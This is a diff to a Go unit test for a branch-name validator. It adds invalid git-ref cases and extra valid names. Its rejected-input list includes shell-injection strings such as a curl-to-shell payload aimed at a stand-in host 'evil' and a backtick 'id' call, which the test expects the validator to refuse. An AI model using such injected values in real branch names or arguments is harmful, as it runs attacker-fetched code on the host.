@@ -247,6 +247,10 @@ func TestCheckBranchName(t *testing.T) {
 		"x$(curl${IFS}-s${IFS}evil|sh)", "x`id`", "a;b", "a|b", "a&b", "it's", `a"b`, `a\b`,
 		"a b", "a\tb", "a\nb", "a(b", "a)b", "a{b}", "a<b", "a>b", "a*", "a?", "a[b]", "~a", "a!", "#a", "a\x00b", "a\x7fb", "a\u3000b",
 		"-x", "",
+		// not a valid git ref (git check-ref-format --branch): refused before
+		// a session row, a port or a worktree is made
+		"feat/", "/feat", "feat//x", "a..b", ".hidden", "feat/.x", "feat.", "feat/x.lock", "x.lock",
+		"a:b", "a^b", "a@{1}", "@", "HEAD",
 	} {
 		if bad == "" {
 			continue
@@ -255,7 +259,7 @@ func TestCheckBranchName(t *testing.T) {
 			t.Errorf("%q accepted", bad)
 		}
 	}
-	for _, ok := range []string{"feat/x", "fix/login-safari", "release/1.2", "feat/12-csv_export", "pr-12", "feat/issue-7-csv-export", "user@host", "日本語"} {
+	for _, ok := range []string{"feat/x", "fix/login-safari", "release/1.2", "feat/12-csv_export", "pr-12", "feat/issue-7-csv-export", "user@host", "日本語", "a.b", "v1.2.3", "feat/x.locked", "a@b", "a-.b"} {
 		if err := CheckBranchName(ok); err != nil {
 			t.Errorf("%q refused: %v", ok, err)
 		}
